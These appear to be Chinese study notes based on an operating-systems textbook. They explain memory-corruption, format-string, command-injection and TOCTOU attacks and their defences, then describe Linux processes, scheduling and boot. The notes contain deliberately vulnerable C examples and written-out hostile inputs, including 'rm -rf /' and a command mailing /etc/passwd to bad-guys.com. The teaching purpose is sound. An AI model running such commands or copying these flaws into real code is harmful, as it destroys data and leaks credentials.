现在假设这不是一个善意的用户错误地提供了一个过长的消息，而是一个攻击者，他提供了一个专门旨在破坏程序控制流的定制消息。假设攻击者提供了一个精心设计的输入，用缓冲区B的地址覆盖返回地址，结果是在从函数A返回时，程序将跳转到缓冲区B的开头，并将缓冲区中的字节作为代码执行。由于攻击者控制着缓冲区的内容，他可以用机器指令填充缓冲区——在原始程序的上下文中执行攻击者的代码。实际上，攻击者已经用自己的代码覆盖了内存并执行了它。程序现在完全在攻击者的控制之下。他可以让它做任何他想做的事。通常，攻击者代码用于启动shell(例如通过exec系统调用)，使入侵者能够方便地访问计算机。由于这个原因，这样的代码通常被称为shellcode，即使它不生成shell。

这个技巧不仅适用于使用gets的程序(尽管您确实应该避免使用该函数)，也适用于在缓冲区中复制用户提供的数据而不检查边界是否违反的任何代码。这些用户数据可能包括命令行参数、环境字符串、通过网络连接发送的数据或从用户文件读取的数据。有许多函数可以复制或移动这样的数据：strcpy、memcpy、strcat等等。当然，您自己编写的任何将字节移动到缓冲区的旧循环也可能容易受到攻击。

如果攻击者不知道要返回的确切地址怎么办？攻击者通常可以猜测shellcode的大致位置，但不能准确猜到。在这种情况下，一个典型的解决方案是在shellcode前面加上一个nop sled：一个单字节的NO OPERATION指令序列，它根本不做任何事情。只要攻击者设法降落在nop sled上的任何地方，执行最终也将到达真正的shellcode。sled既可以在堆栈上工作，也可以在堆上工作。在堆上，攻击者经常试图通过在堆上到处放置nop sled和shellcode来增加攻击的机会。例如，在浏览器中，恶意JavaScript代码可能会尝试分配尽可能多的内存，并用长nop sled和少量shellcode填充内存。然后，如果攻击者设法转移控制流并以随机堆地址为目标，那么他很可能会击中nop sled。这种技术被称为heap spraying。

**其它攻击和对抗方法**

**stack canaries**：在程序进行函数调用的地方，编译器插入代码在堆栈上保存一个随机的canary值，就在返回地址的下面。当函数返回时，编译器插入代码来检查金丝雀的值。如果值发生了变化，说明出了问题。在这种情况下，最好是按下紧急按钮，然后崩溃，而不是继续。

**避免stack canaries**：Canaries可以很好地抵御像上面这样的攻击，但许多缓冲区溢出仍然是可能的。下面展示了一段程序，它使用了两个新函数。strcpy是一个C库函数，用于将字符串复制到缓冲区中，而strlen则决定字符串的长度。

```c
void A(char *date){
    int len;
    char B[128];
    char logMsg[256];
    strcpy(logMsg, date);	// 首先复制登录信息中带有日期的字符串
    len = strlen(date);		// 因为不同日期的英文字母长度不等，所以需要获取日期长度
    gets(B);				// 获得实际信息
    strcpy(logMsg+len, B);	// 将实际信息复制到logMessage中，放在日期后面
    writeLog(logMsg);		// 将登录信息写入磁盘
}
```

让我们假设系统使用stack canaries。我们怎么可能更改返回地址呢？诀窍在于，当攻击者溢出缓冲区B时，他不会试图立即命中返回地址。相反，他修改了位于堆栈上它上面的变量len。在第9行中，len用作偏移量，决定将缓冲区B的内容写到哪里。程序员的想法是只跳过日期字符串，但由于攻击者控制着len，他可能会用它来跳过canaries并覆盖返回地址。

此外，缓冲区溢出并不局限于返回地址。任何可以通过溢出访问的函数指针都是合理的。函数指针就像普通指针一样，只是它指向函数而不是数据。例如，C和c++允许程序员声明变量f作为一个指针，该指针指向一个接受字符串参数但不返回结果的函数，如下所示

```c
void (*f)(char *);
```

语法可能有点晦涩，但它实际上只是另一个变量声明。由于前面示例中的函数A匹配上述签名，我们现在可以写“f = A”，并在程序中使用f代替A。详细介绍函数指针超出了本书的范围，但请放心，函数指针在操作系统中非常常见。现在假设攻击者设法覆盖了一个函数指针。一旦程序使用函数指针调用函数，它就会调用攻击者注入的代码。为了使漏洞发挥作用，函数指针甚至不需要在堆栈上。堆上的函数指针同样有用。只要攻击者能够改变函数指针的值或包含攻击者代码的缓冲区的返回地址，他就能够改变程序的控制流。

**data execution prevention**：也许现在你会惊呼:“等一下!问题的真正原因不在于攻击者能够覆盖函数指针和返回地址，而在于他能够注入代码并使其执行。为什么不让它不可能在堆和堆栈上执行字节呢？如果是这样，你就顿悟了。然而，我们很快就会看到，顿悟并不总能阻止缓冲区溢出攻击。不过，这个想法还是很不错的。如果攻击者提供的字节不能作为合法代码执行，则代码注入攻击将不再有效。

现代cpu有一个通常被称为NX位的特性，它代表“No-eXecute”。区分数据段(堆、堆栈和全局变量)和文本段(包含代码)非常有用。具体来说，许多现代操作系统试图确保数据段是可写的，但不是可执行的，文本段是可执行的，但不是可写的。此策略在OpenBSD上称为W * X(发音为“W Exclusive-OR X”)或“W XOR X”)。它表示内存要么是可写的，要么是可执行的，但不能两者都是。Mac OS X、Linux和Windows的保护方案类似。这种安全措施的通用名称是DEP(数据执行预防)。有些硬件不支持NX位。在这种情况下，DEP仍然有效，但执行是在软件中进行的。DEP可以防止到目前为止讨论的所有攻击。攻击者可以向进程中注入任意多的shell代码。除非他能够使内存可执行，否则无法运行它。

**code reuse attacks**：DEP使在数据区域执行代码成为不可能。stack canary使得覆盖返回地址和函数指针变得更加困难(但并非不可能)。不幸的是，这并不是故事的结局，因为在这个过程中，其他人也有了顿悟。他的见解大致如下：既然二进制文件中已经有很多代码，为什么还要注入代码呢？换句话说，攻击者不是引入新的代码，而是简单地从二进制文件和库中的现有函数和指令中构建必要的功能。我们将首先查看此类攻击中最简单的一种，回到libc，然后讨论更复杂但非常流行的面向返回的编程技术。

假设缓冲区溢出覆盖了当前函数的返回地址，但不能在堆栈上执行攻击者提供的代码。问题是:它能回到别的地方吗？事实证明是可以的。几乎所有的C程序都链接到（通常是共享的）库libc，它包含了大多数C程序需要的关键函数。其中一个函数是*system*，它接受一个字符串作为参数，并将其传递给shell执行。因此，使用*system*函数，攻击者可以执行任何他想要的程序。因此，攻击者不执行shellcode，而是简单地在堆栈上放置一个包含要执行的命令的字符串，并通过返回地址将控制转移到*system*函数。

这种攻击被称为“重返libc”，有几种变体。*system*并不是攻击者唯一感兴趣的功能。例如，攻击者也可以使用*mprotect*函数使部分数据段可执行。此外，攻击不是直接跳到libc函数，而是采取一定程度的间接攻击。例如，在Linux上，攻击者可能会返回到PLT(过程链接表)。PLT是一种使动态链接更容易的结构，它包含的代码片段在执行时依次调用动态链接的库函数。返回到该代码，然后间接执行库函数。

ROP(面向返回的编程)的概念将重用程序代码的思想发挥到了极致。攻击者可以返回到文本段中的任何指令，而不是返回到库函数的(入口点)。例如，他可以使代码落在函数的中间，而不是开始。执行将在该点继续，每次执行一条指令。假设在执行了几个指令之后，执行遇到了另一个返回指令。现在，我们再次问同样的问题：我们能回到哪里?由于攻击者控制了堆栈，他可以再次使代码返回到他想要的任何地方。而且，他做了两次之后，还可以再做三次、四次、十次，等等。

因此，面向返回的编程技巧是寻找小代码序列(a)做一些有用的事情，(b)以返回指令结束。攻击者可以通过他放在堆栈上的返回地址将这些序列串在一起。单独的代码片段称为小工具。通常，它们具有非常有限的功能，例如添加两个寄存器，将内存中的值加载到寄存器中，或者将值压入堆栈。换句话说，gadget的集合可以被看作是一个非常奇怪的指令集，攻击者可以通过巧妙地操纵堆栈来构建任意功能。与此同时，堆栈指针充当了一种有点奇怪的程序计数器。

**Address-Space layout randomization**：有一个办法可以阻止这些攻击。除了修改返回地址和注入一些(ROP)程序之外，攻击者应该能够返回到正确的地址——有了ROP，就不可能出现任何错误。如果地址是固定的，这很简单，但如果地址不是固定的呢?ASLR(地址空间布局随机化)的目的是在每次程序运行之间随机化函数和数据的地址。因此，攻击者利用系统变得更加困难。具体来说，ASLR经常随机化初始堆栈、堆和库的位置。像canary和DEP一样，许多现代操作系统支持ASLR，但通常在不同的程度上。它们中的大多数都为用户应用程序提供它，但只有少数将它始终如一地应用于操作系统内核本身(Giuffrida et al.， 2012)。这三种保护机制的联合力量大大提高了攻击者的门槛。仅仅跳转到注入的代码，甚至是内存中的一些现有函数都变得很困难。它们共同构成了现代操作系统中的一道重要防线。它们的特别之处在于，它们以非常合理的性能成本提供保护。

**绕过ASLR**：即使启用了所有三种防御，攻击者仍然可以设法利用系统。ASLR有几个弱点，可以让入侵者绕过它。第一个缺点是ASLR通常不够随机。许多ASLR的实现仍然在固定的位置有特定的代码。此外，即使一个段是随机的，随机化也可能是弱的，因此攻击者可以暴力破解它。例如，在32位系统上，熵可能是有限的，因为您不能随机化堆栈的所有位。为了保持堆栈作为一个向下增长的常规堆栈工作，随机化最低有效位不是一种选择。对ASLR更重要的攻击是由内存泄露形成的。在这种情况下，攻击者利用一个漏洞不直接控制程序，而是泄露有关内存布局的信息，然后利用这些信息利用第二个漏洞。作为一个简单的例子，考虑以下代码:

```c
void C(){
    int index;
    int prime[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    printf("which prime number between would you like to see?");
    index = read_user_input();
    printf("Prime number %d is: %d \n", index, prime[index]);
}
```

这段代码包含了一个函数调用 *read_user_input*，不是C的标准库，假设其没有任何错误。即便如此，对于这段代码，还是很容易泄露信息。我们所需要做的就是提供一个大于15或小于0的索引。由于程序不检查索引，它将愉快地返回内存中任何整数的值。一个函数的地址对于成功的攻击来说通常是足够的。原因是，尽管加载库的位置可能是随机的，但每个函数与该位置的相对偏移量通常是固定的。换句话说:如果你知道一个函数，你就知道所有的函数。即使情况并非如此，只有一个代码地址，通常也很容易找到许多其他代码地址。

**Noncontrol-Flow Diverting Attacks**：到目前为止，我们已经讨论了对程序控制流的攻击:修改函数指针和返回地址。目标始终是使程序执行新功能，即使这些功能是从二进制文件中已经存在的代码中回收的。然而，这并不是唯一的可能性。对于攻击者来说，数据本身也可能是一个有趣的目标，如下面的伪代码片段所示：

```c
void A( ) {
	int authorized;
	char name [128];
	authorized = check_credentials (...); /* the attacker is not authorized, so returns 0 */
	printf("What is your name?\n");
	gets(name);
	if (authorized != 0) {
		printf("Welcome %s, here is all our secret data\n", name)
		/* ... show secret data ... */
	} else
		printf("Sorry %s, but you are not authorized.\n");
	}
}
```

该代码用于进行授权检查。只有拥有正确凭证的用户才被允许查看绝密数据。*check_credentials*函数不是来自C库的函数，但我们假设它存在于程序的某个地方，并且不包含任何错误。现在假设攻击者输入129个字符。与前一种情况一样，缓冲区将溢出，但不会修改返回地址。相反，攻击者修改了授权变量的值，给它一个不为0的值。该程序不会崩溃，也不会执行任何攻击者代码，但它会将秘密信息泄露给未经授权的用户。

#### Format String Attacks

考虑下面的程序：

```c
char *s = "Hello World";
printf("%s", s);
```

在这个程序中，字符串变量s被声明并初始化为一个字符串，该字符串由“Hello World”和一个表示字符串结束的零字节组成。对printf函数的调用有两个参数，一个是格式字符串" %s "，它指示它打印一个字符串，另一个是字符串的地址。当执行时，这段代码将字符串打印到屏幕上(或者任何标准输出的地方)。它是正确的。

假设程序员写出了下面的程序：

```c
char *s = "hello world";
printf(s);
```

因为printf具有可变数量的参数，其中第一个参数必须是格式字符串。但是不包含任何格式化信息(例如“%s”)的字符串是合法的，因此，尽管第二个版本不是很好的编程实践，但它是允许的，并且它将工作。最重要的是，它节省了输入五个字符，这显然是一个巨大的胜利。

六个月后，另一些程序员被指示修改代码，首先询问用户的名字，然后用名字问候用户。在匆匆研究了代码之后，他对代码做了一些修改，如下所示：

```c
char s[100], g[100] = "hello";	// 声明s和g;初始化g
gets(s);						// 将键盘上的字符串读入s
strcat(g, s);					// 将s连接到g的末尾
printf(g);						// 打印 g
```

现在，它将一个字符串读入变量s，并将其连接到初始化的字符串g中，以构建g中的输出消息。它仍然有效。到目前为止一切都很好(除了使用*gets*，它容易受到缓冲区溢出攻击，但仍然很流行)。

然而，看到这段代码的知识渊博的用户很快就会意识到，从键盘接受的输入不仅仅是一个字符串;它是一个格式字符串，因此*printf*允许的所有格式规范都可以工作。虽然大多数格式化指示符，如“%s”(用于打印字符串)和“%d”(用于打印十进制整数)都格式化输出，但有一对是特殊的。特别是，“%n”不打印任何内容。相反，它计算在字符串中出现的位置已经输出了多少字符，并将其存储到printf要处理的下一个参数中。下面是一个使用“%n”的示例程序：

```c
int main(int argc, char *argv[]){
    int i = 0;
    printf("Hello %n world", &i);		// %n存储到i中
    printf("i=%d\n", i);				// 现在i=6
}
```

注意，变量i已经被*printf*调用修改了，这对每个人来说都不是显而易见的。虽然这个特性千载难逢，但它意味着打印格式字符串可能会导致将一个单词或许多单词存储到内存中。在*printf*中包含这个特性是个好主意吗?当然不是，但当时看起来很方便。很多软件漏洞都是这样开始的。

正如我们在前面的例子中看到的，修改代码的程序员偶然允许程序用户（无意中）输入格式字符串。由于打印格式字符串会覆盖内存，因此我们现在有了覆盖堆栈上printf函数的返回地址并跳转到其他地方(例如，跳转到新输入的格式字符串)所需的工具。这种方法被称为格式字符串攻击。

执行格式字符串攻击并不完全是微不足道的。函数打印的字符数将存储在哪里?在格式字符串本身后面的参数地址处，如上面的示例所示。但是在易受攻击的代码中，攻击者只能提供一个字符串（并且没有第二个参数给*printf*）。实际上，*printf*函数会假定存在第二个参数。它只会取堆栈上的下一个值并使用它。攻击者还可以让*printf*使用堆栈上的下一个值，例如通过提供以下格式字符串作为输入:

```c
"%08x %n"
```

“%08x”表示printf将把下一个参数打印为8位十六进制数。因此，如果该值为1，它将打印0000001。换句话说，对于这个格式字符串，printf将简单地假设堆栈上的下一个值是它应该打印的32位数字，其后的值是它应该存储打印字符数的位置地址，在本例中，十六进制数为9:8，空格为1。假设他提供了格式字符串

```c
"%08x %08x %n"
```

在这种情况下，printf将把值存储在堆栈中格式字符串后面的第三个值所提供的地址，以此类推。这是使上述格式字符串错误成为攻击者“在任何地方写任何东西”原语的关键。细节超出了本书的范围，但其思想是攻击者确保堆栈上有正确的目标地址。

#### Dangling pointers

该技术最简单的表现形式很容易理解，但生成一个漏洞可能很棘手。C和c++允许程序使用malloc调用在堆上分配内存，该调用返回指向新分配的内存块的指针。之后，当程序不再需要它时，它调用free来释放内存。当程序意外地使用已经释放的内存时，就会发生悬空指针错误。考虑以下代码：

```c
int *A = (int *) malloc(128);			// 申请128个整数空间
int year_of_birth = read_user_input();	// 读取一个整数
if (input < 1900) {
	printf ("Error, year of birth should be greater than 1900 \n");
	free (A);
} else {
	...
	/* do something interesting with array A */
	...
}
... /* many more statements, containing malloc and free */
A[0] = year_of_birth;
```

最后一行可能会对已经释放的A赋值，指针A仍然指向相同的地址，但它不应该再被使用了。实际上，到目前为止，内存可能已经被另一个缓冲区重用了。

问题是:会发生什么？最后一行中的store将尝试更新数组A不再使用的内存，并且可能会修改现在存在于该内存区域中的不同数据结构。一般来说，这种内存损坏不是一件好事，但如果攻击者能够以这样一种方式操纵程序，即在该内存中放置一个特定的堆对象，该对象的第一个整数包含用户的授权级别，则情况会变得更糟。这并不总是容易做到的，但有一些技术(被称为堆风水)可以帮助攻击者做到这一点。他现在可以将授权级别设置为任何值(最高可达1900)。

#### Null pointer dereference attacks

您可能还记得现代操作系统是如何虚拟化内核和用户进程的地址空间的。在程序访问内存地址之前，MMU通过页表将该虚拟地址转换为物理地址。不能访问未映射的页。假设内核地址空间和用户进程的地址空间完全不同似乎是合乎逻辑的，但情况并非总是如此。例如，在Linux中，内核被简单地映射到每个进程的地址空间中，每当内核开始执行处理系统调用时，它将在进程的地址空间中运行。在32位操作系统中，用户空间占用地址空间的底部3gb，内核占用地址空间的顶部1gb。这种共存的原因是效率——在地址空间之间切换是昂贵的。通常这种安排不会引起任何问题。

当攻击者可以在用户空间中调用内核函数时，情况就发生了变化。内核为什么要这样做呢?显然，不应该这样做。但是，请记住我们正在讨论的是bug。有bug的内核可能会在罕见的不幸情况下不小心解引用NULL指针。例如，它可以使用尚未初始化的函数指针调用函数。近年来，在Linux内核中发现了几个这样的错误。空指针解引用是一件令人讨厌的事情，因为它通常会导致崩溃。

这在用户进程中已经够糟糕的了，因为它会使程序崩溃，但在内核中更糟糕，因为它会使整个系统崩溃。有时更糟糕的是，攻击者能够从用户进程触发空指针解引用。在这种情况下，他可以随时让系统崩溃。然而，破坏一个系统并不能让你从你的黑客朋友那里得到任何欢呼——他们想看到一个shell。发生崩溃是因为没有在第0页上映射代码。因此，攻击者可以使用特殊的函数*mmap*来解决这个问题。使用*mmap*，用户进程可以请求内核在特定地址映射内存。在映射地址为0的页面后，攻击者可以在该页中编写shellcode。最后，他触发空指针解引用，导致shellcode以内核特权执行。大家击掌庆祝。在现代内核中，不可能再映射地址为0的页面。即便如此，许多较老的内核仍在使用。此外，这个技巧也适用于具有不同值的指针。对于某些错误，攻击者可能会将自己的指针注入内核，并将其解引用。我们从这个漏洞中吸取的教训是，内核与用户的交互可能会出现在意想不到的地方，并且为了提高性能而进行的优化可能会在以后以攻击的形式困扰您。

#### Integer overflow attacks

计算机对固定长度的数字进行整数运算，通常是8、16、32或64位长。如果要添加或乘的两个数字的和超过可以表示的最大整数，则会发生溢出。C程序不会捕捉到这个错误;它们只是存储和使用了不正确的值。特别是，如果变量是有符号整数，那么两个正整数相加或相乘的结果可能被存储为一个负整数。如果变量是无符号的，结果将是正的，但可能会被截断。例如，考虑两个无符号16位整数，每个都包含值40,000。如果将它们相乘，并将结果存储在另一个无符号16位整数中，则乘积为4096。显然这是不正确的，但它没有被检测到。

这种导致未检测到的数字溢出的能力可以转化为攻击。一种方法是为程序提供两个有效的(但很大的)参数，并知道它们将被添加或相乘并导致溢出。例如，一些图形程序有命令行参数，给出图像文件的高度和宽度，例如，输入图像要转换为对应的大小。如果选择目标宽度和高度来强制溢出，则程序将错误地计算存储图像所需的内存大小，并调用malloc为其分配一个太小的缓冲区。缓冲区溢出攻击的时机已经成熟。当有符号正整数的和或乘积得到负整数时，也可能出现类似的漏洞。

#### Command injection attacks

该攻击涉及让目标程序在没有意识到的情况下执行命令。考虑一个程序，它在某些时候需要以不同的名称复制一些用户提供的文件(可能作为备份)。如果程序员懒得写代码，他可以使用系统函数，该函数派生出一个shell，并将其参数作为shell命令执行。例如，C代码

```c
system("ls > file-list")
```

会在shell中执行命令，列出当前目录中的所有文件，并将它们写入一个名为file-list的文件。

```sh
ls > file-list
```

该程序所做的是询问源文件和目标文件的名称，使用cp构建命令行，然后调用系统执行它。假设用户分别输入“abc”和“xyz”，那么shell将执行的命令是

```sh
cp abc xyz
```

不幸的是，这段代码使用一种称为命令注入的技术打开了一个巨大的安全漏洞。假设用户输入“abc”和“xyz;Rm -rf / "代替。现在构造和执行的命令是

```sh
cp abc xyz; rm -rf/
```

它首先复制文件，然后尝试递归地删除整个文件系统中的每个文件和每个目录。如果程序以超级用户身份运行，则很可能成功。当然，问题在于分号后面的所有内容都是作为shell命令执行的。

第二个参数的另一个例子可能是“xyz;邮件snooper@badguys。/etc/passwd”，生成

```sh
cp abc xyz; mail snooper@bad-guys.com </etc/passwd
```

从而将密码文件发送到未知且不受信任的地址。

#### Time of check to time of use attacks

最后一个攻击具有非常不同的性质。它与内存损坏或命令注入无关。相反，它利用竞争条件。像往常一样，最好用一个例子来说明。考虑下面的代码：

```c
int fd;
if(access("./my_document", W_OK)!=0){
    exit(1);
}
fd = open("./my_document", O_WRONLY);
write(fd, user_input, sizeof(user_input));
```

我们再次假设该程序是SETUID root，并且攻击者希望使用其特权写入密码文件。当然，他没有写密码文件的权限，但是让我们看一下代码。我们注意到的第一件事是，SETUID程序根本不应该写入密码文件——它只希望写入当前工作目录中名为“my document”的文件。然而，即使用户在其当前工作目录中可能有这个文件，这并不意味着他真的有对这个文件的写权限。例如，该文件可以是指向根本不属于用户的另一个文件的符号链接，例如密码文件。

为了防止这种情况，程序执行检查，以确保用户通过访问系统调用对文件具有写访问权限。调用检查实际的文件(即，如果它是一个符号链接，它将被解引用)，如果请求的访问被允许返回0，否则返回错误值-1。而且，检查是使用调用进程的真实UID执行的，而不是使用有效UID(因为如果不这样，SETUID进程将始终具有访问权)。只有检查成功，程序才会继续打开文件并将用户输入写入其中。

这个程序看起来很安全，但实际上并非如此。问题是对特权进行*access*检查的时间和使用特权的时间是不一样的。假设在访问检查之后的几分之一秒，攻击者设法创建了与密码文件具有相同文件名的符号链接。在这种情况下，*open*将打开错误的文件，并且攻击者的数据写入将最终出现在密码文件中。为了实现这一目标，攻击者必须与程序赛跑，以便在正确的时间创建符号链接。

这种攻击被称为TOCTOU(检查时间到使用时间)攻击。观察这种特殊攻击的另一种方法是观察访问系统调用根本不安全。最好先打开文件，然后使用文件描述符检查权限，而不是使用*fstat*函数。文件描述符是安全的，因为攻击者不能在*fstat*和*write*调用之间更改它们。由此可见，为操作系统设计一个好的API是极其重要且相当困难的。在这种情况下，设计师弄错了。

### Insider attacks

另一类完全不同的攻击可能被称为“内部工作”。“这些是由运行被保护计算机或制作关键软件的公司的程序员和其他雇员执行的。这些攻击不同于外部攻击，因为内部人员拥有外部人员所不具备的专业知识和访问权限。下面我们将给出几个例子;所有这些都在过去反复发生过。在攻击者是谁、被攻击者是谁以及攻击者想要达到什么目的方面，每个攻击都有不同的风格。

1. **logic bombs**：在程序插入一段代码，当没有接收到对应的信号，便会出现问题
2. **back doors**：在程序中添加后门。
3. **logic spoofing**：使用伪造的登陆界面来获取其他用户登录信息。

。。。

## Case study 1: UNIX, Linux and Anoroid

### Processes in Linux

#### Fundamental Concepts

Linux系统中的主要活动实体是进程。每个进程运行一个程序，最初只有一个控制线程。换句话说，它有一个程序计数器，它跟踪下一个要执行的指令。Linux允许进程在启动后创建额外的线程。

在Linux中以一种特别简单的方式创建进程。*fork*函数系统调用创建原始进程的精确副本。分叉进程称为父进程。新进程称为子进程。父母和孩子都有自己的内存镜像。如果父进程随后更改了它的任何变量，那么子进程就看不到这些更改，反之亦然。打开的文件在父节点和子节点之间共享。也就是说，如果某个文件在fork之前在父进程中打开，那么在fork之后它将继续在父进程和子进程中打开。任何一方对文件所做的更改对另一方都是可见的。这种行为是合理的，因为这些更改对于打开文件的任何不相关进程也是可见的。

*fork*是在Linux系统中创建新进程的主要方法。它创建原始进程的精确副本，包括所有文件描述符、寄存器和其他所有内容。在*fork*之后，原始进程和副本(父进程和子进程)将分道扬镳。所有变量在分叉时都有相同的值，但是由于整个父地址空间被复制来创建子地址空间，因此其中一个的后续更改不会影响另一个。fork调用返回一个值，该值在子进程中为零，等于父进程中子进程的PID。使用返回的PID，两个进程可以看到哪个是父进程，哪个是子进程。

在大多数情况下，在*fork*之后，子进程需要执行与父进程不同的代码。考虑shell的情况。它从终端读取命令，派生子进程，等待子进程执行该命令，然后在子进程终止时读取下一个命令。为了等待子进程完成，父进程执行一个*waitpid*系统调用，它只等待子进程终止(如果存在多个子进程，则任意子进程终止)。*waitpid*有三个参数。第一个方法允许调用者等待一个特定的子进程。如果为- 1，则任何旧的子节点(即第一个终止的子节点)都可以。第二个参数是一个变量的地址，该变量将被设置为子进程的退出状态(正常或异常终止和退出值)。这让父进程知道子进程的命运。第三个参数确定调用方是阻塞还是返回(如果没有终止子进程)。

#### Implementation of processes and threads in Linux

Linux中的进程就像一座冰山:您只能看到水面上的部分，但下面还有一个重要的部分。每个进程都有一个运行用户程序的用户部分。但是，当其中一个线程进行系统调用时，它会进入内核模式并开始在内核上下文中运行，使用不同的内存映射和对所有机器资源的完全访问。它仍然是同一个线程，但是现在有了更多的功能，并且有了自己的内核模式堆栈和内核模式程序计数器。这很重要，因为系统调用可能在中途阻塞，例如，等待磁盘操作完成。然后保存程序计数器和寄存器，以便稍后可以在内核模式下重新启动线程。

Linux内核内部通过*task_struct*将进程表示为任务。与其他操作系统方法(区分进程、轻量级进程和线程)不同，Linux使用任务结构来表示任何执行上下文。因此，单线程进程将用一个任务结构表示，而多线程进程将为每个用户级线程提供一个任务结构。最后，内核本身是多线程的，并且具有内核级线程，这些线程与任何用户进程都没有关联，并且正在执行内核代码。在本节稍后的部分中，我们将回到多线程进程(以及一般的线程)的处理。

对于每个进程，一个*task_struct*类型的进程描述符一直驻留在内存中。它包含内核管理所有进程所需的重要信息，包括调度参数、打开文件描述符列表等等。进程描述符以及用于进程的内核模式堆栈的内存是在进程创建时创建的。

任务结构包含各种字段。其中一些字段包含指向其他数据结构或段的指针，例如那些包含有关打开文件的信息的指针。其中一些段与进程的用户级结构相关，当用户进程不可运行时，这一点就不重要了。因此，为了不把内存浪费在不需要的信息上，这些信息可能会被交换或换出。例如，虽然进程可能在交换时被发送信号，但它不可能读取文件。由于这个原因，有关信号的信息必须一直在内存中，即使进程不在内存中也是如此。另一方面，关于文件描述符的信息可以保存在用户结构中，只有当进程处于内存中且可运行时才会被引入。

进程描述符中的信息可分为若干大类，大致描述如下：

1. 调度参数：进程优先级，最近消耗的CPU时间，最近花费的睡眠时间。它们一起用于确定接下来运行哪个进程。
2. 内存映像：指向文本、数据和堆栈段或页表的指针。如果文本段是共享的，则文本指针指向共享文本表。当进程不在内存中时，关于如何在磁盘上找到它的部分的信息也在这里。
3. 信号：掩码显示哪些信号被忽略，哪些被捕获，哪些被暂时阻塞，哪些正在传递。
4. 机器寄存器：当内核发生陷阱时，机器寄存器(包括浮点寄存器，如果使用的话)保存在这里。
5. 系统调用状态：关于当前系统调用的信息，包括参数和结果。
6. 文件描述符表：当调用涉及文件描述符的系统调用时，文件描述符被用作该表的索引，以定位与该文件对应的核心数据结构(i-node)。
7. Accounting：指向一个表的指针，该表跟踪进程所使用的用户和系统CPU时间。有些系统还在这里对进程可能使用的CPU时间、堆栈的最大大小、可能消耗的页帧数量以及其他项进行限制。
8. 内核堆栈：一个固定的堆栈，供进程的内核部分使用。
9. 杂项：当前进程状态、正在等待的事件(如果有的话)、直到闹钟响起的时间、PID、父进程的PID以及用户和组标识。

记住这些信息，现在就很容易解释如何在Linux中创建进程了。创建新进程的机制实际上相当简单，为子进程创建一个新的进程描述符和用户区域，并主要从父进程填充。子进程被赋予一个PID，它的内存映射被设置，并且它被赋予对父进程文件的共享访问权。然后设置它的寄存器，它就可以运行了。

当一个*fork*系统调用被执行时，调用进程会进入内核，并创建一个任务结构和一些其他伴随的数据结构，比如内核模式堆栈和*thread_info*结构。这个结构是在进程栈尾的固定偏移处分配的，它包含几个进程参数，以及进程描述符的地址。通过将进程描述符的地址存储在固定位置，Linux只需要很少的高效操作就可以定位正在运行的进程的任务结构。大多数进程描述符内容是根据父进程的描述符值填写的。然后，Linux寻找一个可用的PID，即当前没有任何进程使用的PID，并更新PID哈希表项，以指向新的任务结构。在哈希表中发生冲突的情况下，进程描述符可能被链接起来。它还将*task_struct*中的字段设置为指向任务数组中相应的上一个/下一个进程。

原则上，它现在应该为子进程的数据和堆栈段分配内存，并精确地复制父进程的段，因为*fork*的语义表明父进程和子进程之间不共享内存。文本段可以被复制或共享，因为它是只读的。在这一点上，子进程准备运行了。然而，复制内存是昂贵的，所以所有现代Linux系统都采取了特殊方法。它们给子进程自己的页表，但让它们指向父进程的页，只标记为只读。每当任何进程(子进程或父进程)试图在页面上写入时，它都会得到一个保护错误。内核看到这一点，然后将页面的新副本分配给故障进程，并将其标记为读/写。通过这种方式，只需要复制实际写入的页面。这种机制称为写时复制。它还有一个额外的好处，即不需要在内存中保存两个程序副本，从而节省了RAM。在子进程开始运行之后，在那里运行的代码(在我们的示例中是shell的副本)执行一个exec系统调用，并将命令名作为参数。内核现在查找并验证可执行文件，将参数和环境字符串复制到内核，并释放旧的地址空间及其页表。

现在必须创建并填充新的地址空间。如果系统支持映射文件(正如Linux和几乎所有其他基于unix的系统所做的那样)，则会设置新的页表来指示内存中没有页(可能除了一个堆栈页)，但是地址空间由磁盘上的可执行文件支持。当新进程开始运行时，它将立即得到一个页面错误，这将导致从可执行文件中调入代码的第一页。通过这种方式，无需预先加载任何内容，因此程序可以快速启动，只在需要的页面中出现故障，而不会出现其他问题。最后，参数和环境字符串被复制到新的堆栈中，信号被重置，寄存器被初始化为全零。此时，新命令可以开始运行。

#### Scheduling in Linux

Linux线程是内核线程，因此调度基于线程，而不是进程。出于调度目的，Linux区分了三类线程：

1. Real-time FIFO
2. Real-time round robin
3. Timesharing

Real-time FIFO线程是最高优先级的，除非被一个新准备好的具有更高优先级的Real-time FIFO线程抢占。Real-time round robin线程与Real-time FIFO线程相同，只是它们具有与之相关的时间量，并且可以被时钟抢占。如果准备好了多个Real-time round robin线程，则每个线程运行其分配时长，之后它将转到Real-time round robin线程列表的末尾。这两个类实际上都不是实时的。不能规定最后期限，也不能给出保证。这些类的优先级仅仅高于标准分时类中的线程。Linux称它们为real time的原因是Linux符合使用这些名称的P1003.4标准(UNIX的“实时”扩展)。实时线程在内部用从0到99的优先级级别表示，0是最高的实时优先级，99是最低的实时优先级。

传统的非实时线程形成一个单独的类，并由单独的算法调度，因此它们不会与实时线程竞争。在内部，这些线程与100到139的优先级级别相关联，也就是说，Linux内部区分140个优先级级别(用于实时和非实时任务)。对于实时轮询线程，Linux根据非实时任务的需求和优先级分配CPU时间。

#### Booting Linux

具体细节因平台而异，但一般来说，以下步骤表示引导过程。当计算机启动时，BIOS执行开机自检(POST)和初始设备发现和初始化，因为操作系统的启动过程可能依赖于对磁盘、屏幕、键盘等的访问。接下来，引导磁盘的第一个扇区MBR(主引导记录)被读入一个固定的内存位置并执行。这个扇区包含一个小(512字节)程序，它从引导设备(如SATA或SCSI磁盘)加载一个称为*boot*的独立程序。引导程序首先将自身复制到一个固定的高内存地址，为操作系统释放低内存。一旦移动，*boot*将读取引导设备的根目录。要做到这一点，它必须理解文件系统和目录格式，GRUB (GRand Unified Bootloader)等一些引导加载程序就是这种情况。其他流行的引导加载程序，如英特尔的LILO，不依赖于任何特定的文件系统。相反，它们需要一个块映射和低级地址(描述物理扇区、磁头和圆柱体)来找到要加载的相关扇区。然后*boot*读取操作系统内核并跳转到内核。此时，它已经完成了它的工作，内核正在运行。内核启动代码是用汇编语言编写的，并且高度依赖于机器。典型的工作包括设置内核堆栈、识别CPU类型、计算现有的RAM数量、禁用中断、启用MMU，最后调用c语言主过程来启动操作系统的主要部分。

